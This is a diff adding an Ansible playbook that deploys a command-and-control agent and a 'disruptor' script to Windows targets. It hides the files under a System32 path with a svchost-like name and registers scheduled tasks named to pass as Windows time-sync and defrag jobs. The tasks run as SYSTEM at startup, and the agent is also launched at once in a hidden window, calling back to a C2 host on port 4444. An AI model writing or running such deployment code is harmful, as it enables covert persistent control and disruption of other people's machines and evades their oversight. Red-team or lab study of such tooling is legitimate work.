@@ -1,0 +1,68 @@
+---
+# deploy.yml
+# Deploys C2 agent and disruptor to Windows targets
+
+- name: Deploy C2 agent to Windows targets
+  hosts: windows
+  vars:
+    deploy_dir: "C:\\Windows\\System32\\drivers\\etc\\sync\\"
+    agent_script: "{{ deploy_dir }}svchost_helper.py"
+    disruptor_script: "{{ deploy_dir }}disruptor.py"
+
+    local_agent: "./c2/c2agent.py"
+    local_disruptor: "./c2/disruptor.py"
+
+    c2_host: "10.100.1.144"
+    c2_port: "4444"
+
+    agent_task: "MicrosoftWindowsTimeSyncTask"
+    disruptor_task: "MicrosoftWindowsDefragTask"
+
+  tasks:
+
+    - name: Create deploy directory
+      ansible.windows.win_file:
+        path: "{{ deploy_dir }}"
+        state: directory
+
+    - name: Copy agent to target
+      ansible.windows.win_copy:
+        src: "{{ local_agent }}"
+        dest: "{{ agent_script }}"
+
+    - name: Copy disruptor to target
+      ansible.windows.win_copy:
+        src: "{{ local_disruptor }}"
+        dest: "{{ disruptor_script }}"
+
+    - name: Remove old agent task if exists
+      ansible.windows.win_shell: |
+        schtasks /Delete /TN "{{ agent_task }}" /F
+      ignore_errors: true
+
+    - name: Create scheduled task to run agent on startup
+      ansible.windows.win_shell: |
+        schtasks /Create /TN "{{ agent_task }}" /TR "python {{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
+
+    - name: Run the agent now without waiting for reboot
+      ansible.windows.win_shell: |
+        Start-Process python -ArgumentList "{{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" -WindowStyle Hidden
+      ignore_errors: true
+
+    - name: Remove old disruptor task if exists
+      ansible.windows.win_shell: |
+        schtasks /Delete /TN "{{ disruptor_task }}" /F
+      ignore_errors: true
+
+    - name: Create disruptor scheduled task
+      ansible.windows.win_shell: |
+        schtasks /Create /TN "{{ disruptor_task }}" /TR "python {{ disruptor_script }}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
+
+    - name: Confirm agent file is in place
+      ansible.windows.win_stat:
+        path: "{{ agent_script }}"
+      register: agent_file
+
+    - name: Print result
+      debug:
+        msg: "Agent deployed to {{ inventory_hostname }} at {{ agent_script }} — file exists: {{ agent_file.stat.exists }}"
